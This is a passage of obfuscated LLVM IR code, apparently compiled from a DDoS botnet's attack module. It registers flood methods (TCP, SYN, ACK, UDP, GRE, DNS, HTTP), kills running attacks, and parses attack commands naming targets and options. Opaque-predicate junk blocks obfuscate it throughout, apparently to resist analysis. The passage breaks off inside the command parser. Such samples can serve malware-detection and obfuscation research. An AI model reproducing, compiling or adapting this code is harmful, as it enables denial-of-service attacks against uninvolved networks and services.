x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.255, i32 0, i32 0)], align 16
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcp)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpplain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_stdhex)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greip)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greeth)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udprandom)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpack)
  call void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpsyn)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpstorm)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_dns)
  call void @add_attack(i8 zeroext 11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_app_http)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = load i32, i32* @x.1
  %4 = load i32, i32* @y.2
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8, align 1
  %12 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %13 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %11, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %12, align 8
  %14 = call noalias i8* @calloc(i64 1, i64 16) #6
  %15 = bitcast i8* %14 to %struct.attack_method*
  store %struct.attack_method* %15, %struct.attack_method** %13, align 8
  %16 = load i8, i8* %11, align 1
  %17 = load %struct.attack_method*, %struct.attack_method** %13, align 8
  %18 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %17, i32 0, i32 1
  store i8 %16, i8* %18, align 8
  %19 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %12, align 8
  %20 = load %struct.attack_method*, %struct.attack_method** %13, align 8
  %21 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %20, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %19, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %21, align 8
  %22 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %23 = bitcast %struct.attack_method** %22 to i8*
  %24 = load i8, i8* @methods_len, align 1
  %25 = zext i8 %24 to i32
  %26 = add nsw i32 %25, 1
  %27 = sext i32 %26 to i64
  %28 = mul i64 %27, 8
  %29 = call i8* @realloc(i8* %23, i64 %28) #6
  %30 = bitcast i8* %29 to %struct.attack_method**
  store %struct.attack_method** %30, %struct.attack_method*** @methods, align 8
  %31 = load %struct.attack_method*, %struct.attack_method** %13, align 8
  %32 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %33 = load i8, i8* @methods_len, align 1
  %34 = add i8 %33, 1
  store i8 %34, i8* @methods_len, align 1
  %35 = zext i8 %33 to i64
  %36 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %32, i64 %35
  store %struct.attack_method* %31, %struct.attack_method** %36, align 8
  %37 = load i32, i32* @x.1
  %38 = load i32, i32* @y.2
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %45 = alloca i8, align 1
  %46 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %47 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %45, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %46, align 8
  %48 = call noalias i8* @calloc(i64 1, i64 16) #6
  %49 = bitcast i8* %48 to %struct.attack_method*
  store %struct.attack_method* %49, %struct.attack_method** %47, align 8
  %50 = load i8, i8* %45, align 1
  %51 = load %struct.attack_method*, %struct.attack_method** %47, align 8
  %52 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %51, i32 0, i32 1
  store i8 %50, i8* %52, align 8
  %53 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %46, align 8
  %54 = load %struct.attack_method*, %struct.attack_method** %47, align 8
  %55 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %54, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %53, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %55, align 8
  %56 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %57 = bitcast %struct.attack_method** %56 to i8*
  %58 = load i8, i8* @methods_len, align 1
  %59 = zext i8 %58 to i32
  %_ = sub i32 %59, 1
  %gen = mul i32 %_, 1
  %_1 = sub i32 0, %59
  %gen2 = add i32 %_1, 1
  %60 = add nsw i32 %59, 1
  %61 = sext i32 %60 to i64
  %_3 = sub i64 %61, 8
  %gen4 = mul i64 %_3, 8
  %_5 = sub i64 %61, 8
  %gen6 = mul i64 %_5, 8
  %_7 = sub i64 %61, 8
  %gen8 = mul i64 %_7, 8
  %_9 = sub i64 0, %61
  %gen10 = add i64 %_9, 8
  %62 = mul i64 %61, 8
  %63 = call i8* @realloc(i8* %57, i64 %62) #6
  %64 = bitcast i8* %63 to %struct.attack_method**
  store %struct.attack_method** %64, %struct.attack_method*** @methods, align 8
  %65 = load %struct.attack_method*, %struct.attack_method** %47, align 8
  %66 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %67 = load i8, i8* @methods_len, align 1
  %_11 = shl i8 %67, 1
  %_12 = sub i8 %67, 1
  %gen13 = mul i8 %_12, 1
  %_14 = shl i8 %67, 1
  %_15 = sub i8 %67, 1
  %gen16 = mul i8 %_15, 1
  %_17 = sub i8 0, %67
  %gen18 = add i8 %_17, 1
  %68 = add i8 %67, 1
  store i8 %68, i8* @methods_len, align 1
  %69 = zext i8 %67 to i64
  %70 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %66, i64 %69
  store %struct.attack_method* %65, %struct.attack_method** %70, align 8
  br label %originalBB
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %37, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 15
  br i1 %4, label %5, label %40

; <label>:5:                                      ; preds = %2
  %6 = load i32, i32* %1, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %7
  %9 = load i32, i32* %8, align 4
  %10 = icmp ne i32 %9, 0
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %5
  %12 = load i32, i32* %1, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %13
  %15 = load i32, i32* %14, align 4
  %16 = call i32 @kill(i32 %15, i32 9) #6
  br label %17

; <label>:17:                                     ; preds = %11, %5
  %18 = load i32, i32* @x.3
  %19 = load i32, i32* @y.4
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  %26 = load i32, i32* %1, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %27
  store i32 0, i32* %28, align 4
  %29 = load i32, i32* @x.3
  %30 = load i32, i32* @y.4
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %37

; <label>:37:                                     ; preds = %originalBBpart2
  %38 = load i32, i32* %1, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %1, align 4
  br label %2

; <label>:40:                                     ; preds = %2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %17
  %41 = load i32, i32* %1, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %42
  store i32 0, i32* %43, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = load i32, i32* @x.5
  %4 = load i32, i32* @y.6
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_target*, align 8
  %19 = alloca %struct.attack_option*, align 8
  %20 = alloca i8, align 1
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  store %struct.attack_target* null, %struct.attack_target** %18, align 8
  store %struct.attack_option* null, %struct.attack_option** %19, align 8
  %21 = load i32, i32* %12, align 4
  %22 = sext i32 %21 to i64
  %23 = icmp ult i64 %22, 4
  %24 = load i32, i32* @x.5
  %25 = load i32, i32* @y.6
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %23, label %32, label %33

; <label>:32:                                     ; preds = %originalBBpart2
  br label %347

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i8*, i8** %11, align 8
  %35 = bitcast i8* %34 to i32*
  %36 = load i32, i32* %35, align 4
  %37 = call i32 @ntohl(i32 %36) #7
  store i32 %37, i32* %14, align 4
  %38 = load i8*, i8** %11, align 8
  %39 = getelementptr inbounds i8, i8* %38, i64 4
  store i8* %39, i8** %11, align 8
  %40 = load i32, i32* %12, align 4
  %41 = sext i32 %40 to i64
  %42 = sub i64 %41, 4
  %43 = trunc i64 %42 to i32
  store i32 %43, i32* %12, align 4
  %44 = load i32, i32* %12, align 4
  %45 = icmp eq i32 %44, 0
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %33
  br label %347

; <label>:47:                                     ; preds = %33
  %48 = load i8*, i8** %11, align 8
  %49 = getelementptr inbounds i8, i8* %48, i32 1
  store i8* %49, i8** %11, align 8
  %50 = load i8, i8* %48, align 1
  store i8 %50, i8* %15, align 1
  %51 = load i32, i32* %12, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 %52, 1
  %54 = trunc i64 %53 to i32
  store i32 %54, i32* %12, align 4
  %55 = load i32, i32* %12, align 4
  %56 = icmp eq i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %47
  br label %347

; <label>:58:                                     ; preds = %47
  %59 = load i8*, i8** %11, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %11, align 8
  %61 = load i8, i8* %59, align 1
  store i8 %61, i8* %16, align 1
  %62 = load i32, i32* %12, align 4
  %63 = sext i32 %62 to i64
  %64 = sub i64 %63, 1
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %12, align 4
  %66 = load i8, i8* %16, align 1
  %67 = zext i8 %66 to i32
  %68 = icmp eq i32 %67, 0
  br i1 %68, label %69, label %70

; <label>:69:                                     ; preds = %58
  br label %347

; <label>:70:                                     ; preds = %58
  %71 = load i32, i32* @x.5
  %72 = load i32, i32* @y.6
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %70
  %79 = load i32, i32* %12, align 4
  %80 = sext i32 %79 to i64
  %81 = load i8, i8* %16, align 1
  %82 = zext i8 %81 to i64
  %83 = mul i64 5, %82
  %84 = icmp ult i64 %80, %83
  %85 = load i32, i32* @x.5
  %86 = load i32, i32* @y.6
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart25, label %originalBB1alteredBB

originalBBpart25:                                 ; preds = %originalBB1
  br i1 %84, label %93, label %94

; <label>:93:                                     ; preds = %originalBBpart25
  br label %347

; <label>:94:                                     ; preds = %originalBBpart25
  %95 = load i8, i8* %16, align 1
  %96 = zext i8 %95 to i64
  %97 = call noalias i8* @calloc(i64 %96, i64 24) #6
  %98 = bitcast i8* %97 to %struct.attack_target*
  store %struct.attack_target* %98, %struct.attack_target** %18, align 8
  store i32 0, i32* %13, align 4
  br label %99

; <label>:99:                                     ; preds = %162, %94
  %100 = load i32, i32* %13, align 4
  %101 = load i8, i8* %16, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp slt i32 %100, %102
  br i1 %103, label %104, label %165

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* @x.5
  %106 = load i32, i32* @y.6
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %104
  %113 = load i8*, i8** %11, align 8
  %114 = bitcast i8* %113 to i32*
  %115 = load i32, i32* %114, align 4
  %116 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %117 = load i32, i32* %13, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %116, i64 %118
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %119, i32 0, i32 1
  store i32 %115, i32* %120, align 4
  %121 = load i8*, i8** %11, align 8
  %122 = getelementptr inbounds i8, i8* %121, i64 4
  store i8* %122, i8** %11, align 8
  %123 = load i8*, i8** %11, align 8
  %124 = getelementptr inbounds i8, i8* %123, i32 1
  store i8* %124, i8** %11, align 8
  %125 = load i8, i8* %123, align 1
  %126 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %127 = load i32, i32* %13, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 2
  store i8 %125, i8* %130, align 4
  %131 = load i32, i32* %12, align 4
  %132 = sext i32 %131 to i64
  %133 = sub i64 %132, 5
  %134 = trunc i64 %133 to i32
  store i32 %134, i32* %12, align 4
  %135 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %136 = load i32, i32* %13, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i64 %137
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %138, i32 0, i32 0
  %140 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %139, i32 0, i32 0
  store i16 2, i16* %140, align 4
  %141 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %142 = load i32, i32* %13, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %141, i64 %143
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i32 0, i32 1
  %146 = load i32, i32* %145, align 4
  %147 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %148 = load i32, i32* %13, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i64 %149
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i32 0, i32 0
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %151, i32 0, i32 2
  %153 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %152, i32 0, i32 0
  store i32 %146, i32* %153, align 4
  %154 = load i32, i32* @x.5
  %155 = load i32, i32* @y.6
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBBpart214, label %originalBB7alteredBB

originalBBpart214:                                ; preds = %originalBB7
  br label %162

; <label>:162:                                    ; preds = %originalBBpart214
  %163 = load i32, i32* %13, align 4
  %164 = add nsw i32 %163, 1
  store i32 %164, i32* %13, align 4
  br label %99

; <label>:165:                                    ; preds = %99
  %166 = load i32, i32* %12, align 4
  %167 = sext i32 %166 to i64
  %168 = icmp ult i64 %167, 1
  br i1 %168, label %169, label %186

; <label>:169:                                    ; preds = %165
  %170 = load i32, i32* @x.5
  %171 = load i32, i32* @y.6
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %169
  %178 = load i32, i32* @x.5
  %179 = load i32, i32* @y.6
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br label %347

; <label>:186:                                    ; preds = %165
  %187 = load i8*, i8** %11, align 8
  %188 = getelementptr inbounds i8, i8* %187, i32 1
  store i8* %188, i8** %11, align 8
  %189 = load i8, i8* %187, align 1
  store i8 %189, i8* %17, align 1
  %190 = load i32, i32* %12, align 4
  %191 = sext i32 %190 to i64
  %192 = sub i64 %191, 1
  %193 = trunc i64 %192 to i32
  store i32 %193, i32* %12, align 4
  %194 = load i8, i8* %17, align 1
  %195 = zext i8 %194 to i32
  %196 = icmp sgt i32 %195, 0
  br i1 %196, label %197, label %339

; <label>:197:                                    ; preds = %186
  %198 = load i32, i32* @x.5
  %199 = load i32, i32* @y.6
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
